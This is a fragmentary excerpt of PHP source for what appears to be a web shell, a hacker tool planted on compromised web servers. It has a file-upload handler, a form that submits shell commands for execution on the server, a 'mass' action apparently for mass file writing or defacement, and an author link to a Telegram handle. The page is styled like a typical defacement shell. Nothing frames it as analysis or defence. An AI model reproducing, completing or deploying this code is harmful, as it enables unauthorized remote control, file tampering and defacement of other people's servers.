...
<body bgcolor="#080c24" text="#d80404">
...
a:hover {
	color: #007700;
	text-shadow:0px 0px 10px #d80404;
}
...
function author() {
	echo "<center><br><a href='https://t.me/WhoSle3py'>&#128680; Get More Info</a></center><br>";
	exit();
}
...
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		...
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
...
print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ...
			  <input style='border: none; border-bottom: 1px solid #080c24;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #080c24;' class='input' type='submit' value='>>'>
			  </form>";
			print "</center>";
			}
		}
	...
	elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <input style='background: transparent; color: #d80404; border: 1px solid #d80404; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
					   </form></center>";
			}
		}
...
echo '<br><div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
